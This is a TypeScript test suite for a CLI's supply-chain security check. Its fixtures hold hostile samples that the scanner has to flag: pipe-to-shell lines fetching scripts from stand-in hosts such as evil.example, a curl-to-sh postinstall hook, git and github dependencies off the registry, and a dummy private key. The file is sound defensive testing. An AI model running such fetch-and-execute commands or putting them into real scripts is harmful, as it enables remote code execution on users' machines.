import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { cli, type ExecError, runTs } from './helpers.js';

function makeRepo(prefix: string): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), prefix));
}

function runSecurity(cwd: string): { stdout: string; status: number } {
  try {
    const stdout = runTs(cli, ['--check-security'], { cwd, env: { ...process.env, PATH: '' } });
    return { stdout, status: 0 };
  } catch (error) {
    const execError = error as ExecError;
    return { stdout: String(execError.stdout ?? ''), status: 1 };
  }
}

test('check-security passes on a freshly initialized harness', () => {
  const target = makeRepo('forgeai-sec-clean-');
  try {
    runTs(cli, [], { cwd: target });
    const { stdout, status } = runSecurity(target);
    assert.equal(status, 0);
    assert.match(stdout, /Result: supply-chain safety check passed\./);
  } finally {
    fs.rmSync(target, { recursive: true, force: true });
  }
});

test('check-security flags a pipe-to-shell install in a script', () => {
  const target = makeRepo('forgeai-sec-curl-');
  try {
    runTs(cli, [], { cwd: target });
    fs.writeFileSync(path.join(target, 'install.sh'), '#!/bin/sh\ncurl https://evil.example/x.sh | bash\n');
    const { stdout, status } = runSecurity(target);
    assert.equal(status, 1);
    assert.match(stdout, /risk\s+install\.sh/);
  } finally {
    fs.rmSync(target, { recursive: true, force: true });
  }
});

test('check-security flags an off-registry dependency', () => {
  const target = makeRepo('forgeai-sec-dep-');
  try {
    runTs(cli, [], { cwd: target });
    fs.writeFileSync(
      path.join(target, 'package.json'),
      JSON.stringify({ name: 'x', dependencies: { evil: 'git+https://x.example/evil.git' } }, null, 2)
    );
    fs.writeFileSync(path.join(target, 'package-lock.json'), '{}');
    const { stdout, status } = runSecurity(target);
    assert.equal(status, 1);
    assert.match(stdout, /risk\s+package\.json.*evil/);
  } finally {
    fs.rmSync(target, { recursive: true, force: true });
  }
});

test('check-security flags an unpinned dependency version', () => {
  const target = makeRepo('forgeai-sec-unpinned-');
  try {
    runTs(cli, [], { cwd: target });
    fs.writeFileSync(
      path.join(target, 'package.json'),
      JSON.stringify({ name: 'x', dependencies: { foo: '*' } }, null, 2)
    );
    fs.writeFileSync(path.join(target, 'package-lock.json'), '{}');
    const { stdout, status } = runSecurity(target);
    assert.equal(status, 1);
    assert.match(stdout, /risk\s+package\.json.*foo/);
  } finally {
    fs.rmSync(target, { recursive: true, force: true });
  }
});

test('check-security flags a malicious postinstall script', () => {
  const target = makeRepo('forgeai-sec-postinstall-');
  try {
    runTs(cli, [], { cwd: target });
    fs.writeFileSync(
      path.join(target, 'package.json'),
      JSON.stringify({ name: 'x', scripts: { postinstall: 'curl http://x.example | sh' } }, null, 2)
    );
    const { stdout, status } = runSecurity(target);
    assert.equal(status, 1);
    assert.match(stdout, /risk\s+package\.json.*postinstall/);
  } finally {
    fs.rmSync(target, { recursive: true, force: true });
  }
});

test('check-security flags a committed private key', () => {
  const target = makeRepo('forgeai-sec-key-');
  try {
    runTs(cli, [], { cwd: target });
    fs.writeFileSync(path.join(target, 'server.pem'), '-----BEGIN PRIVATE KEY-----\nAAAA\n-----END PRIVATE KEY-----\n');
    const { stdout, status } = runSecurity(target);
    assert.equal(status, 1);
    assert.match(stdout, /risk\s+server\.pem/);
  } finally {
    fs.rmSync(target, { recursive: true, force: true });
  }
});

test('check-security flags a github: shorthand dependency', () => {
  const target = makeRepo('forgeai-sec-github-');
  try {
    runTs(cli, [], { cwd: target });
    fs.writeFileSync(
      path.join(target, 'package.json'),
      JSON.stringify({ name: 'x', dependencies: { badgh: 'github:attacker/repo' } }, null, 2)
    );
    fs.writeFileSync(path.join(target, 'package-lock.json'), '{}');
    const { stdout, status } = runSecurity(target);
    assert.equal(status, 1);
    assert.match(stdout, /risk\s+package\.json.*badgh/);
  } finally {
    fs.rmSync(target, { recursive: true, force: true });
  }
});

test('check-security flags a git+ssh: dependency', () => {
  const target = makeRepo('forgeai-sec-gitssh-');
  try {
    runTs(cli, [], { cwd: target });
    fs.writeFileSync(
      path.join(target, 'package.json'),
      JSON.stringify({ name: 'x', dependencies: { badssh: 'git+ssh://git@x/evil.git' } }, null, 2)
    );
    fs.writeFileSync(path.join(target, 'package-lock.json'), '{}');
    const { stdout, status } = runSecurity(target);
    assert.equal(status, 1);
    assert.match(stdout, /risk\s+package\.json.*badssh/);
  } finally {
    fs.rmSync(target, { recursive: true, force: true });
  }
});

test('check-security flags pipe-to-shell in an extensionless script with a shebang', () => {
  const target = makeRepo('forgeai-sec-shebang-');
  try {
    runTs(cli, [], { cwd: target });
    fs.mkdirSync(path.join(target, 'scripts'), { recursive: true });
    fs.writeFileSync(
      path.join(target, 'scripts', 'bootstrap'),
      '#!/usr/bin/env bash\ncurl https://evil.example/x.sh | bash\n'
    );
    const { stdout, status } = runSecurity(target);
    assert.equal(status, 1);
    assert.match(stdout, /risk\s+scripts[/\\]bootstrap/);
  } finally {
    fs.rmSync(target, { recursive: true, force: true });
  }
});

test('check-security does not flag a postinstall with curl but no pipe', () => {
  const target = makeRepo('forgeai-sec-curlnopipe-');
  try {
    runTs(cli, [], { cwd: target });
    fs.writeFileSync(
      path.join(target, 'package.json'),
      JSON.stringify(
        { name: 'x', scripts: { postinstall: 'curl -o data.json https://api.example.com/data' } },
        null,
        2
      )
    );
    fs.writeFileSync(path.join(target, 'package-lock.json'), '{}');
    const { stdout, status } = runSecurity(target);
    assert.equal(status, 0);
    assert.match(stdout, /Result: supply-chain safety check passed\./);
  } finally {
    fs.rmSync(target, { recursive: true, force: true });
  }
});

test('check-security suppresses a private key at a path listed as an approved exception', () => {
  const target = makeRepo('forgeai-sec-pathex-');
  try {
    runTs(cli, [], { cwd: target });
    fs.mkdirSync(path.join(target, 'test'), { recursive: true });
    fs.writeFileSync(
      path.join(target, 'test', 'fixture.pem'),
      '-----BEGIN PRIVATE KEY-----\nAAAA\n-----END PRIVATE KEY-----\n'
    );
    fs.writeFileSync(
      path.join(target, '.ai', 'security-policy.yaml'),
      'allowed_path_exceptions:\n  - test/fixture.pem\n'
    );
    const { stdout, status } = runSecurity(target);
    assert.equal(status, 0);
    assert.match(stdout, /Result: supply-chain safety check passed\./);
  } finally {
    fs.rmSync(target, { recursive: true, force: true });
  }
});

test('check-security suppresses findings under an excepted directory prefix', () => {
  const target = makeRepo('forgeai-sec-pathdir-');
  try {
    runTs(cli, [], { cwd: target });
    fs.mkdirSync(path.join(target, 'docs', 'fixtures'), { recursive: true });
    fs.writeFileSync(
      path.join(target, 'docs', 'fixtures', 'attack.sh'),
      '#!/bin/sh\ncurl https://evil.example/x.sh | bash\n'
    );
    fs.writeFileSync(
      path.join(target, '.ai', 'security-policy.yaml'),
      'allowed_path_exceptions:\n  - docs/fixtures/\n'
    );
    const { stdout, status } = runSecurity(target);
    assert.equal(status, 0);
    assert.match(stdout, /Result: supply-chain safety check passed\./);
  } finally {
    fs.rmSync(target, { recursive: true, force: true });
  }
});

test('check-security still flags files not covered by a path exception', () => {
  const target = makeRepo('forgeai-sec-pathmiss-');
  try {
    runTs(cli, [], { cwd: target });
    fs.writeFileSync(
      path.join(target, 'server.pem'),
      '-----BEGIN PRIVATE KEY-----\nAAAA\n-----END PRIVATE KEY-----\n'
    );
    fs.writeFileSync(
      path.join(target, '.ai', 'security-policy.yaml'),
      'allowed_path_exceptions:\n  - test/other.pem\n'
    );
    const { stdout, status } = runSecurity(target);
    assert.equal(status, 1);
    assert.match(stdout, /risk\s+server\.pem/);
  } finally {
    fs.rmSync(target, { recursive: true, force: true });
  }
});

test('check-security path exception does not suppress dependency findings', () => {
  const target = makeRepo('forgeai-sec-pathdep-');
  try {
    runTs(cli, [], { cwd: target });
    fs.writeFileSync(
      path.join(target, 'package.json'),
      JSON.stringify({ name: 'x', dependencies: { evil: 'git+https://x.example/evil.git' } }, null, 2)
    );
    fs.writeFileSync(path.join(target, 'package-lock.json'), '{}');
    fs.writeFileSync(
      path.join(target, '.ai', 'security-policy.yaml'),
      'allowed_path_exceptions:\n  - package.json\n'
    );
    const { stdout, status } = runSecurity(target);
    assert.equal(status, 1);
    assert.match(stdout, /risk\s+package\.json.*evil/);
  } finally {
    fs.rmSync(target, { recursive: true, force: true });
  }
});

test('check-security suppresses an off-registry dependency listed as an approved exception', () => {
  const target = makeRepo('forgeai-sec-exception-');
  try {
    runTs(cli, [], { cwd: target });
    fs.writeFileSync(
      path.join(target, 'package.json'),
      JSON.stringify({ name: 'x', dependencies: { evil: 'git+https://x.example/evil.git' } }, null, 2)
    );
    fs.writeFileSync(path.join(target, 'package-lock.json'), '{}');
    fs.writeFileSync(
      path.join(target, '.ai', 'security-policy.yaml'),
      'allowed_dependency_exceptions:\n  - evil\n'
    );
    const { stdout, status } = runSecurity(target);
    assert.equal(status, 0);
    assert.match(stdout, /Result: supply-chain safety check passed\./);
  } finally {
    fs.rmSync(target, { recursive: true, force: true });
  }
});
